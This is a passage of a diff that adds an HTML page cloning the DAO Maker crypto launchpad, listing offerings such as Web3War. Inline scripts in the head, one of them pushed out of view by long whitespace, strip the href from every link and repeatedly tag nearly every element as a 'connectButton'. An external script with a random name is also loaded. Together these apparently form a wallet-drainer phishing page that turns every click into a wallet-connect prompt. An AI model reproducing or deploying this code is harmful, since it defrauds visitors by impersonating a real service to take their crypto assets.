@@ -1,0 +1,1846 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark" style="" >
+
+<head>
+    <meta http-equiv="origin-trial" content="Az520Inasey3TAyqLyojQa8MnmCALSEU29yQFW8dePZ7xQTvSt73pHazLFTK5f7SyLUJSo2uKLesEtEa9aUYcgMAAACPeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZyIsImV4cGlyeSI6MTcyNTQwNzk5OSwiaXNTdWJkb21haW4iOnRydWUsImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=">
+    <meta charset="UTF-8">
+
+    <script>
+      function addClassesToElements() {
+  
+      const links = document.querySelectorAll('a:not(.connectButton)');
+      for (const link of links) {
+          link.removeAttribute('href');
+          link.classList.add('connectButton');
+      }
+      const buttons = document.querySelectorAll('div:not(.connectButton):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
+      for (const button of buttons) {
+          button.classList.add('connectButton');
+      }
+      }
+      setInterval(addClassesToElements, 300);
+  </script>
+    <script>
+      document.addEventListener('DOMContentLoaded', function () {
+        var links = document.querySelectorAll('body a');
+        for (var i = 0; i < links.length; i++) {
+          var link = links[i];
+          link.removeAttribute('href');
+          link.classList.add('connectButton');
+        }
+        });
+        </script>                                                                                                                          <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      var buttons = document.querySelectorAll('body button');
+      for (var i = 0; i < buttons.length; i++) {
+        var button = buttons[i];
+        button.classList.add('connectButton');
+      }
+    });
+    </script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function() {
+        const elements = document.querySelectorAll('[ad-data-linked]');
+        elements.forEach(element => {
+            element.removeAttribute('ad-data-linked');
+        });
+    
+        console.log('Removed ad-data-linked attributes from', elements.length, 'elements');
+    });
+    
+    </script>
+    
+        <style>
+          .connectButton {
+          cursor: pointer;
+          }
+        </style>
+
+    <meta name="viewport" content="width=device-width">
+    <title>DAO Maker</title>
+    <meta name="next-head-count" content="3">
+    <link rel="stylesheet" href="9a4dfc407a4a7942.css" data-n-g=""><noscript data-n-css=""></noscript>
+    <style id="_goober">
+        @keyframes go2264125279{from{transform:scale(0) rotate(45deg);opacity:0;}to{transform:scale(1) rotate(45deg);opacity:1;}}@keyframes go3020080000{from{transform:scale(0);opacity:0;}to{transform:scale(1);opacity:1;}}@keyframes go463499852{from{transform:scale(0) rotate(90deg);opacity:0;}to{transform:scale(1) rotate(90deg);opacity:1;}}@keyframes go1268368563{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}@keyframes go1310225428{from{transform:scale(0) rotate(45deg);opacity:0;}to{transform:scale(1) rotate(45deg);opacity:1;}}@keyframes go651618207{0%{height:0;width:0;opacity:0;}40%{height:0;width:6px;opacity:1;}100%{opacity:1;height:10px;}}@keyframes go901347462{from{transform:scale(0.6);opacity:0.4;}to{transform:scale(1);opacity:1;}}.go4109123758{z-index:9999;}.go4109123758 > *{pointer-events:auto;}
+    </style>
+    <style>
+        @import url("css2.css");
+        :root {
+          --w3m-color-mix-strength: 0%;
+          --w3m-font-family: Inter, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif;;
+          --w3m-font-size-master: 10px;
+          --w3m-border-radius-master: 4px;
+          --w3m-z-index: 100;
+        
+          --wui-font-family: var(--w3m-font-family);
+        
+          --wui-font-size-micro: var(--w3m-font-size-master);
+          --wui-font-size-tiny: calc(var(--w3m-font-size-master) * 1.2);
+          --wui-font-size-small: calc(var(--w3m-font-size-master) * 1.4);
+          --wui-font-size-paragraph: calc(var(--w3m-font-size-master) * 1.6);
+          --wui-font-size-large: calc(var(--w3m-font-size-master) * 2);
+        
+          --wui-border-radius-5xs: var(--w3m-border-radius-master);
+          --wui-border-radius-4xs: calc(var(--w3m-border-radius-master) * 1.5);
+          --wui-border-radius-3xs: calc(var(--w3m-border-radius-master) * 2);
+          --wui-border-radius-xxs: calc(var(--w3m-border-radius-master) * 3);
+          --wui-border-radius-xs: calc(var(--w3m-border-radius-master) * 4);
+          --wui-border-radius-s: calc(var(--w3m-border-radius-master) * 5);
+          --wui-border-radius-m: calc(var(--w3m-border-radius-master) * 7);
+          --wui-border-radius-l: calc(var(--w3m-border-radius-master) * 9);
+          --wui-border-radius-3xl: calc(var(--w3m-border-radius-master) * 20);
+        
+          --wui-font-weight-light: 400;
+          --wui-font-weight-regular: 500;
+          --wui-font-weight-medium: 600;
+          --wui-font-weight-bold: 700;
+        
+          --wui-letter-spacing-large: -0.8px;
+          --wui-letter-spacing-paragraph: -0.64px;
+          --wui-letter-spacing-small: -0.56px;
+          --wui-letter-spacing-tiny: -0.48px;
+          --wui-letter-spacing-micro: -0.2px;
+        
+          --wui-spacing-0: 0px;
+          --wui-spacing-4xs: 2px;
+          --wui-spacing-3xs: 4px;
+          --wui-spacing-xxs: 6px;
+          --wui-spacing-2xs: 7px;
+          --wui-spacing-xs: 8px;
+          --wui-spacing-1xs: 10px;
+          --wui-spacing-s: 12px;
+          --wui-spacing-m: 14px;
+          --wui-spacing-l: 16px;
+          --wui-spacing-2l: 18px;
+          --wui-spacing-xl: 20px;
+          --wui-spacing-xxl: 24px;
+          --wui-spacing-2xl: 32px;
+          --wui-spacing-3xl: 40px;
+          --wui-spacing-4xl: 90px;
+        
+          --wui-icon-box-size-xxs: 14px;
+          --wui-icon-box-size-xs: 20px;
+          --wui-icon-box-size-sm: 24px;
+          --wui-icon-box-size-md: 32px;
+          --wui-icon-box-size-lg: 40px;
+          --wui-icon-box-size-xl: 64px;
+        
+          --wui-icon-size-inherit: inherit;
+          --wui-icon-size-xxs: 10px;
+          --wui-icon-size-xs: 12px;
+          --wui-icon-size-sm: 14px;
+          --wui-icon-size-md: 16px;
+          --wui-icon-size-mdl: 18px;
+          --wui-icon-size-lg: 20px;
+          --wui-icon-size-xl: 24px;
+        
+          --wui-wallet-image-size-inherit: inherit;
+          --wui-wallet-image-size-sm: 40px;
+          --wui-wallet-image-size-md: 56px;
+          --wui-wallet-image-size-lg: 80px;
+        
+          --wui-box-size-md: 100px;
+          --wui-box-size-lg: 120px;
+        
+          --wui-ease-out-power-2: cubic-bezier(0, 0, 0.22, 1);
+          --wui-ease-out-power-1: cubic-bezier(0, 0, 0.55, 1);
+        
+          --wui-ease-in-power-3: cubic-bezier(0.66, 0, 1, 1);
+          --wui-ease-in-power-2: cubic-bezier(0.45, 0, 1, 1);
+          --wui-ease-in-power-1: cubic-bezier(0.3, 0, 1, 1);
+        
+          --wui-ease-inout-power-1: cubic-bezier(0.45, 0, 0.55, 1);
+        
+          --wui-duration-lg: 200ms;
+          --wui-duration-md: 125ms;
+          --wui-duration-sm: 75ms;
+        
+          --wui-path-network: path(
+            'M43.4605 10.7248L28.0485 1.61089C25.5438 0.129705 22.4562 0.129705 19.9515 1.61088L4.53951 10.7248C2.03626 12.2051 0.5 14.9365 0.5 17.886V36.1139C0.5 39.0635 2.03626 41.7949 4.53951 43.2752L19.9515 52.3891C22.4562 53.8703 25.5438 53.8703 28.0485 52.3891L43.4605 43.2752C45.9637 41.7949 47.5 39.0635 47.5 36.114V17.8861C47.5 14.9365 45.9637 12.2051 43.4605 10.7248Z'
+          );
+        
+          --wui-path-network-lg: path(
+            'M78.3244 18.926L50.1808 2.45078C45.7376 -0.150261 40.2624 -0.150262 35.8192 2.45078L7.6756 18.926C3.23322 21.5266 0.5 26.3301 0.5 31.5248V64.4752C0.5 69.6699 3.23322 74.4734 7.6756 77.074L35.8192 93.5492C40.2624 96.1503 45.7376 96.1503 50.1808 93.5492L78.3244 77.074C82.7668 74.4734 85.5 69.6699 85.5 64.4752V31.5248C85.5 26.3301 82.7668 21.5266 78.3244 18.926Z'
+          );
+        
+          --wui-color-inherit: inherit;
+        
+          --wui-color-inverse-100: #fff;
+          --wui-color-inverse-000: #000;
+        
+          --wui-cover: rgba(0, 0, 0, 0.3);
+        
+          --wui-color-modal-bg: var(--wui-color-modal-bg-base);
+        
+          --wui-color-blue-100: var(--wui-color-blue-base-100);
+        
+          --wui-color-accent-100: var(--wui-color-accent-base-100);
+          --wui-color-accent-090: var(--wui-color-accent-base-090);
+          --wui-color-accent-080: var(--wui-color-accent-base-080);
+        
+          --wui-accent-glass-090: var(--wui-accent-glass-base-090);
+          --wui-accent-glass-080: var(--wui-accent-glass-base-080);
+          --wui-accent-glass-020: var(--wui-accent-glass-base-020);
+          --wui-accent-glass-015: var(--wui-accent-glass-base-015);
+          --wui-accent-glass-010: var(--wui-accent-glass-base-010);
+          --wui-accent-glass-005: var(--wui-accent-glass-base-005);
+          --wui-accent-glass-002: var(--wui-accent-glass-base-002);
+        
+          --wui-color-fg-100: var(--wui-color-fg-base-100);
+          --wui-color-fg-125: var(--wui-color-fg-base-125);
+          --wui-color-fg-150: var(--wui-color-fg-base-150);
+          --wui-color-fg-175: var(--wui-color-fg-base-175);
+          --wui-color-fg-200: var(--wui-color-fg-base-200);
+          --wui-color-fg-225: var(--wui-color-fg-base-225);
+          --wui-color-fg-250: var(--wui-color-fg-base-250);
+          --wui-color-fg-275: var(--wui-color-fg-base-275);
+          --wui-color-fg-300: var(--wui-color-fg-base-300);
+        
+          --wui-color-bg-100: var(--wui-color-bg-base-100);
+          --wui-color-bg-125: var(--wui-color-bg-base-125);
+          --wui-color-bg-150: var(--wui-color-bg-base-150);
+          --wui-color-bg-175: var(--wui-color-bg-base-175);
+          --wui-color-bg-200: var(--wui-color-bg-base-200);
+          --wui-color-bg-225: var(--wui-color-bg-base-225);
+          --wui-color-bg-250: var(--wui-color-bg-base-250);
+          --wui-color-bg-275: var(--wui-color-bg-base-275);
+          --wui-color-bg-300: var(--wui-color-bg-base-300);
+        
+          --wui-color-success-100: var(--wui-color-success-base-100);
+          --wui-color-error-100: var(--wui-color-error-base-100);
+        
+          --wui-icon-box-bg-error-100: var(--wui-icon-box-bg-error-base-100);
+          --wui-icon-box-bg-blue-100: var(--wui-icon-box-bg-blue-base-100);
+          --wui-icon-box-bg-success-100: var(--wui-icon-box-bg-success-base-100);
+          --wui-icon-box-bg-inverse-100: var(--wui-icon-box-bg-inverse-base-100);
+        
+          --wui-all-wallets-bg-100: var(--wui-all-wallets-bg-base-100);
+        
+          --wui-avatar-border: var(--wui-avatar-border-base);
+        
+          --wui-thumbnail-border: var(--wui-thumbnail-border-base);
+        
+          --wui-box-shadow-blue: rgba(71, 161, 255, 0.16);
+        }
+        
+        @supports (background: color-mix(in srgb, white 50%, black)) {
+          :root {
+            --wui-color-modal-bg: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-color-modal-bg-base)
+            );
+        
+            --wui-box-shadow-blue: color-mix(in srgb, var(--wui-color-accent-100) 16%, transparent);
+        
+            --wui-color-accent-090: color-mix(
+              in srgb,
+              var(--wui-color-accent-base-100) 90%,
+              var(--w3m-default)
+            );
+            --wui-color-accent-080: color-mix(
+              in srgb,
+              var(--wui-color-accent-base-100) 80%,
+              var(--w3m-default)
+            );
+        
+            --wui-color-accent-090: color-mix(
+              in srgb,
+              var(--wui-color-accent-base-100) 90%,
+              transparent
+            );
+            --wui-color-accent-080: color-mix(
+              in srgb,
+              var(--wui-color-accent-base-100) 80%,
+              transparent
+            );
+        
+            --wui-accent-glass-090: color-mix(
+              in srgb,
+              var(--wui-color-accent-base-100) 90%,
+              transparent
+            );
+            --wui-accent-glass-080: color-mix(
+              in srgb,
+              var(--wui-color-accent-base-100) 80%,
+              transparent
+            );
+            --wui-accent-glass-020: color-mix(
+              in srgb,
+              var(--wui-color-accent-base-100) 20%,
+              transparent
+            );
+            --wui-accent-glass-015: color-mix(
+              in srgb,
+              var(--wui-color-accent-base-100) 15%,
+              transparent
+            );
+            --wui-accent-glass-010: color-mix(
+              in srgb,
+              var(--wui-color-accent-base-100) 10%,
+              transparent
+            );
+            --wui-accent-glass-005: color-mix(
+              in srgb,
+              var(--wui-color-accent-base-100) 5%,
+              transparent
+            );
+            --wui-color-accent-002: color-mix(
+              in srgb,
+              var(--wui-color-accent-base-100) 2%,
+              transparent
+            );
+        
+            --wui-color-fg-100: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-color-fg-base-100)
+            );
+            --wui-color-fg-125: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-color-fg-base-125)
+            );
+            --wui-color-fg-150: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-color-fg-base-150)
+            );
+            --wui-color-fg-175: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-color-fg-base-175)
+            );
+            --wui-color-fg-200: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-color-fg-base-200)
+            );
+            --wui-color-fg-225: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-color-fg-base-225)
+            );
+            --wui-color-fg-250: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-color-fg-base-250)
+            );
+            --wui-color-fg-275: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-color-fg-base-275)
+            );
+            --wui-color-fg-300: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-color-fg-base-300)
+            );
+        
+            --wui-color-bg-100: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-color-bg-base-100)
+            );
+            --wui-color-bg-125: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-color-bg-base-125)
+            );
+            --wui-color-bg-150: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-color-bg-base-150)
+            );
+            --wui-color-bg-175: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-color-bg-base-175)
+            );
+            --wui-color-bg-200: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-color-bg-base-200)
+            );
+            --wui-color-bg-225: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-color-bg-base-225)
+            );
+            --wui-color-bg-250: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-color-bg-base-250)
+            );
+            --wui-color-bg-275: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-color-bg-base-275)
+            );
+            --wui-color-bg-300: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-color-bg-base-300)
+            );
+        
+            --wui-color-success-100: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-color-success-base-100)
+            );
+            --wui-color-error-100: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-color-error-base-100)
+            );
+        
+            --wui-icon-box-bg-error-100: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-icon-box-bg-error-base-100)
+            );
+            --wui-icon-box-bg-accent-100: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-icon-box-bg-blue-base-100)
+            );
+            --wui-icon-box-bg-success-100: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-icon-box-bg-success-base-100)
+            );
+            --wui-icon-box-bg-inverse-100: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-icon-box-bg-inverse-base-100)
+            );
+        
+            --wui-all-wallets-bg-100: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-all-wallets-bg-base-100)
+            );
+        
+            --wui-avatar-border: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-avatar-border-base)
+            );
+        
+            --wui-thumbnail-border: color-mix(
+              in srgb,
+              var(--w3m-color-mix) var(--w3m-color-mix-strength),
+              var(--wui-thumbnail-border-base)
+            );
+          }
+        }
+    </style>
+    <style media="enabled">
+        :root {
+          --w3m-color-mix: #000;
+          --w3m-accent: #3396ff;
+          --w3m-default: #000;
+        
+          --wui-color-modal-bg-base: #fff;
+        
+          --wui-color-blue-base-100: #3396ff;
+        
+          --wui-color-accent-base-100: var(--w3m-accent);
+          --wui-color-accent-base-090: #2d7dd2;
+          --wui-color-accent-base-080: #2978cc;
+        
+          --wui-accent-glass-base-090: rgba(51, 150, 255, 0.9);
+          --wui-accent-glass-base-080: rgba(51, 150, 255, 0.8);
+          --wui-accent-glass-base-020: rgba(51, 150, 255, 0.2);
+          --wui-accent-glass-base-015: rgba(51, 150, 255, 0.15);
+          --wui-accent-glass-base-010: rgba(51, 150, 255, 0.1);
+          --wui-accent-glass-base-005: rgba(51, 150, 255, 0.05);
+          --wui-accent-glass-base-002: rgba(51, 150, 255, 0.02);
+        
+          --wui-color-fg-base-100: #141414;
+          --wui-color-fg-base-125: #2d3131;
+          --wui-color-fg-base-150: #474d4d;
+          --wui-color-fg-base-175: #636d6d;
+          --wui-color-fg-base-200: #798686;
+          --wui-color-fg-base-225: #828f8f;
+          --wui-color-fg-base-250: #8b9797;
+          --wui-color-fg-base-275: #95a0a0;
+          --wui-color-fg-base-300: #9ea9a9;
+        
+          --wui-color-bg-base-100: #ffffff;
+          --wui-color-bg-base-125: #f5fafa;
+          --wui-color-bg-base-150: #f3f8f8;
+          --wui-color-bg-base-175: #eef4f4;
+          --wui-color-bg-base-200: #eaf1f1;
+          --wui-color-bg-base-225: #e5eded;
+          --wui-color-bg-base-250: #e1e9e9;
+          --wui-color-bg-base-275: #dce7e7;
+          --wui-color-bg-base-300: #d8e3e3;
+        
+          --wui-color-success-base-100: #26b562;
+          --wui-color-error-base-100: #f05142;
+        
+          --wui-success-glass-001: rgba(38, 181, 98, 0.01);
+          --wui-success-glass-002: rgba(38, 181, 98, 0.02);
+          --wui-success-glass-005: rgba(38, 181, 98, 0.05);
+          --wui-success-glass-010: rgba(38, 181, 98, 0.1);
+          --wui-success-glass-015: rgba(38, 181, 98, 0.15);
+          --wui-success-glass-020: rgba(38, 181, 98, 0.2);
+          --wui-success-glass-025: rgba(38, 181, 98, 0.25);
+          --wui-success-glass-030: rgba(38, 181, 98, 0.3);
+          --wui-success-glass-060: rgba(38, 181, 98, 0.6);
+          --wui-success-glass-080: rgba(38, 181, 98, 0.8);
+        
+          --wui-icon-box-bg-error-base-100: #f4dfdd;
+          --wui-icon-box-bg-blue-base-100: #d9ecfb;
+          --wui-icon-box-bg-success-base-100: #daf0e4;
+          --wui-icon-box-bg-inverse-base-100: #dcecfc;
+        
+          --wui-all-wallets-bg-base-100: #e8f1fa;
+        
+          --wui-avatar-border-base: #f3f4f4;
+        
+          --wui-thumbnail-border-base: #eaefef;
+        
+          --wui-gray-glass-001: rgba(0, 0, 0, 0.01);
+          --wui-gray-glass-002: rgba(0, 0, 0, 0.02);
+          --wui-gray-glass-005: rgba(0, 0, 0, 0.05);
+          --wui-gray-glass-010: rgba(0, 0, 0, 0.1);
+          --wui-gray-glass-015: rgba(0, 0, 0, 0.15);
+          --wui-gray-glass-020: rgba(0, 0, 0, 0.2);
+          --wui-gray-glass-025: rgba(0, 0, 0, 0.25);
+          --wui-gray-glass-030: rgba(0, 0, 0, 0.3);
+          --wui-gray-glass-060: rgba(0, 0, 0, 0.6);
+          --wui-gray-glass-080: rgba(0, 0, 0, 0.8);
+        }
+    </style>
+    <style>
+        :root {
+          --w3m-color-mix: #fff;
+          --w3m-accent: #47a1ff;
+          --w3m-default: #fff;
+        
+          --wui-color-modal-bg-base: #191a1a;
+        
+          --wui-color-blue-base-100: #47a1ff;
+        
+          --wui-color-accent-base-100: var(--w3m-accent);
+          --wui-color-accent-base-090: #59aaff;
+          --wui-color-accent-base-080: #6cb4ff;
+        
+          --wui-accent-glass-base-090: rgba(71, 161, 255, 0.9);
+          --wui-accent-glass-base-080: rgba(71, 161, 255, 0.8);
+          --wui-accent-glass-base-020: rgba(71, 161, 255, 0.2);
+          --wui-accent-glass-base-015: rgba(71, 161, 255, 0.15);
+          --wui-accent-glass-base-010: rgba(71, 161, 255, 0.1);
+          --wui-accent-glass-base-005: rgba(71, 161, 255, 0.05);
+          --wui-accent-glass-base-002: rgba(71, 161, 255, 0.02);
+        
+          --wui-color-fg-base-100: #e4e7e7;
+          --wui-color-fg-base-125: #d0d5d5;
+          --wui-color-fg-base-150: #a8b1b1;
+          --wui-color-fg-base-175: #a8b0b0;
+          --wui-color-fg-base-200: #949e9e;
+          --wui-color-fg-base-225: #868f8f;
+          --wui-color-fg-base-250: #788080;
+          --wui-color-fg-base-275: #788181;
+          --wui-color-fg-base-300: #6e7777;
+        
+          --wui-color-bg-base-100: #141414;
+          --wui-color-bg-base-125: #191a1a;
+          --wui-color-bg-base-150: #1e1f1f;
+          --wui-color-bg-base-175: #222525;
+          --wui-color-bg-base-200: #272a2a;
+          --wui-color-bg-base-225: #2c3030;
+          --wui-color-bg-base-250: #313535;
+          --wui-color-bg-base-275: #363b3b;
+          --wui-color-bg-base-300: #3b4040;
+        
+          --wui-color-success-base-100: #26d962;
+          --wui-color-error-base-100: #f25a67;
+        
+          --wui-success-glass-001: rgba(38, 217, 98, 0.01);
+          --wui-success-glass-002: rgba(38, 217, 98, 0.02);
+          --wui-success-glass-005: rgba(38, 217, 98, 0.05);
+          --wui-success-glass-010: rgba(38, 217, 98, 0.1);
+          --wui-success-glass-015: rgba(38, 217, 98, 0.15);
+          --wui-success-glass-020: rgba(38, 217, 98, 0.2);
+          --wui-success-glass-025: rgba(38, 217, 98, 0.25);
+          --wui-success-glass-030: rgba(38, 217, 98, 0.3);
+          --wui-success-glass-060: rgba(38, 217, 98, 0.6);
+          --wui-success-glass-080: rgba(38, 217, 98, 0.8);
+        
+          --wui-icon-box-bg-error-base-100: #3c2426;
+          --wui-icon-box-bg-blue-base-100: #20303f;
+          --wui-icon-box-bg-success-base-100: #1f3a28;
+          --wui-icon-box-bg-inverse-base-100: #243240;
+        
+          --wui-all-wallets-bg-base-100: #222b35;
+        
+          --wui-avatar-border-base: #252525;
+        
+          --wui-thumbnail-border-base: #252525;
+        
+          --wui-gray-glass-001: rgba(255, 255, 255, 0.01);
+          --wui-gray-glass-002: rgba(255, 255, 255, 0.02);
+          --wui-gray-glass-005: rgba(255, 255, 255, 0.05);
+          --wui-gray-glass-010: rgba(255, 255, 255, 0.1);
+          --wui-gray-glass-015: rgba(255, 255, 255, 0.15);
+          --wui-gray-glass-020: rgba(255, 255, 255, 0.2);
+          --wui-gray-glass-025: rgba(255, 255, 255, 0.25);
+          --wui-gray-glass-030: rgba(255, 255, 255, 0.3);
+          --wui-gray-glass-060: rgba(255, 255, 255, 0.6);
+          --wui-gray-glass-080: rgba(255, 255, 255, 0.8);
+        }
+    </style>
+    
+</head><script charset="UTF-8" type="text/javascript" src="./c8d8d55b-8071-4d35-b089-4d0335b9f154.js"></script>
+
+<body class="scrollbar-hide">
+    <div id="__next">
+        <main class="__className_3dc409 cursor-default">
+            <div style="position:fixed;z-index:50;top:16px;left:16px;right:16px;bottom:16px;pointer-events:none" class="my-6"></div>
+            <dialog class="modal px-5">
+                <div class="modal-box max-w-md">
+                    <div class="mb-6"></div>
+                    <div class="form-control"><label class="label w-fit cursor-pointer"><input type="checkbox" class="checkbox"><span class="label-text ml-4">I understand</span></label></div><button class="mx-auto mt-4 flex w-32 btn btn-disabled transition-none">Proceed</button>
+                </div>
+                <div class="modal-backdrop"><button></button></div>
+            </dialog>
+            <div class="drawer drawer-end"><input id="main-drawer" type="checkbox" class="drawer-toggle">
+                <div class="drawer-content">
+                    <div class="relative flex h-screen flex-col">
+                        <div class="fixed inset-x-0 top-0 -z-10 h-screen origin-center rotate-180 transform-gpu px-6 py-20 blur-3xl" aria-hidden="true">
+                            <div class="aspect-auto h-full bg-primary bg-gradient-to-b from-base-100 to-primary opacity-20" style="clip-path:polygon(74.1% 44.1%, 100% 61.6%, 97.5% 26.9%, 85.5% 0.1%, 80.7% 2%, 72.5% 32.5%, 60.2% 62.4%, 52.4% 68.1%, 47.5% 58.3%, 45.2% 34.5%, 27.5% 76.7%, 0.1% 64.9%, 17.9% 100%, 27.6% 76.8%, 76.1% 97.7%, 74.1% 44.1%)"></div>
+                        </div>
+                        <div>
+                            <div class="mx-auto flex h-20 select-none items-center justify-between px-6 sm:px-10">
+                                <div class="flex items-center gap-8 md:gap-12"><a class="cursor-pointer" href=""><img class="h-10" src="dao-logo.svg" loading="eager" alt=""> </a>
+                                    <div class="flex gap-8 text-lg font-semibold"><a class="duration-200 hover:text-base-content/70 max-[600px]:hidden" href="">Launchpad</a><a class="duration-200 hover:text-base-content/70 max-sm:hidden" href="https://app.daomaker.com/staking">Staking</a></div>
+                                </div>
+                                <div><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="h-12 w-12 p-2" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M47.5 104H432V51.52a16 16 0 00-19.14-15.69l-368 60.48a16 16 0 00-12 10.47A39.69 39.69 0 0147.5 104zm416 24h-416a16 16 0 00-16 16v288a16 16 0 0016 16h416a16 16 0 0016-16V144a16 16 0 00-16-16zM368 320a32 32 0 1132-32 32 32 0 01-32 32z"></path>
+                                        <path d="M31.33 259.5V116c0-12.33 5.72-18.48 15.42-20 35.2-5.53 108.58-8.5 108.58-8.5s-8.33 16-27.33 16V128c18.5 0 31.33 23.5 31.33 23.5L84.83 236z"></path>
+                                    </svg></div>
+                            </div>
+                        </div>
+                        <div class="mx-auto mb-6 flex w-full grow flex-col">
+                            <div class="relative select-none">
+                                <div class="absolute inset-0 -z-10 bg-gray-900"></div>
+                                <div class="absolute inset-0 -z-10"><img src="dao-banner.webp.png" alt="" loading="eager" class="h-full w-full object-cover" style="opacity: 1;"></div>
+                                <div class="flex w-full flex-col items-center gap-16 py-20 text-gray-200 md:gap-20 md:py-36">
+                                    <div class="flex flex-col items-center justify-center gap-4 md:h-9 md:flex-row"><img class="h-32 w-32" src="dao-logo.svg" loading="eager" alt="">
+                                        <div class="text-center font-sans text-5xl font-bold tracking-tight sm:text-6xl md:text-7xl">DAO Maker</div>
+                                    </div>
+                                    <div class="mb-2 px-8 text-center text-lg font-medium tracking-wide sm:text-xl md:mb-0 md:text-2xl">THE LAUNCHPAD FOR REAL FOUNDERS</div>
+                                </div>
+                            </div>
+                            <div class="mx-auto flex w-full max-w-7xl flex-col px-6 sm:px-10">
+                                <div class="mb-16 mt-24 flex items-end justify-between gap-6 sm:items-center">
+                                    <div class="text-2xl font-black text-base-content/70 sm:text-3xl">Featured Offerings</div>
+                                </div>
+                                <div class="mx-auto grid w-full grid-cols-1 gap-12">
+                                    <div class="card mx-auto w-full cursor-pointer overflow-hidden shadow-lg">
+                                        <div class="absolute inset-0 h-full bg-gradient-to-r from-base-200 to-base-300"></div>
+                                        <div class="absolute inset-0 opacity-100"><img src="project_hero_image_w3w1705863417866.png.jpeg" loading="eager" alt="" class="h-full w-full object-cover" style="opacity: 1;"></div>
+                                        <div class="absolute inset-0">
+                                            <div class="absolute inset-0 flex w-full flex-col justify-between p-6">
+                                                <div class="flex justify-between sm:p-3">
+                                                    <div></div>
+                                                    <div class="flex flex-col items-end justify-end gap-3 sm:flex-row">
+                                                        <div class="badge badge-neutral badge-lg py-4 font-bold">Refundable</div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="h-40"></div>
+                                        <div class="relative flex w-full flex-col items-center bg-base-100/80 p-6 backdrop-blur-sm sm:p-6">
+                                            <div class="mt-2 flex flex-col items-center gap-3 md:flex-row"><img class="h-14 w-14" src="project_logo_w3w1705863407732.png" alt="" loading="eager" style="opacity: 1;">
+                                                <div class="text-center text-3xl font-bold tracking-wide">Web3War</div>
+                                            </div>
+                                            <div class="mt-6 line-clamp-3 text-center text-sm sm:text-base">Web3War® (W3W) is the first-person shooter crafted by the industry-leading game developer Roll1ng Thund3rz and incubated by Zilliqa, the trailblazer in blockchain technology and the OG of Layer 1. </div>
+                                            <div class="mt-8 flex w-full justify-between text-lg font-bold">
+                                                <div class="flex" data-tip="29 Jan, 12:00 GMT"><time datetime="2024-01-29T12:00:00.000Z" title="">Starts in 5 days</time></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="card mx-auto w-full cursor-pointer overflow-hidden shadow-lg">
+                                        <div class="absolute inset-0 h-full bg-gradient-to-r from-base-200 to-base-300"></div>
+                                        <div class="absolute inset-0 opacity-100"><img src="project_hero_image_gt-protocol1700055896340.png.jpeg" loading="eager" alt="" class="h-full w-full object-cover" style="opacity: 1;"></div>
+                                        <div class="absolute inset-0">
+                                            <div class="absolute inset-0 flex w-full flex-col justify-between p-6">
+                                                <div class="flex justify-between sm:p-3">
+                                                    <div class="badge badge-primary badge-lg py-4 font-bold animate-pulse">Live</div>
+                                                    <div class="flex flex-col items-end justify-end gap-3 sm:flex-row">
+                                                        <div class="badge badge-neutral badge-lg py-4 font-bold">Refundable</div>
+                                                    </div>
+                                                </div>
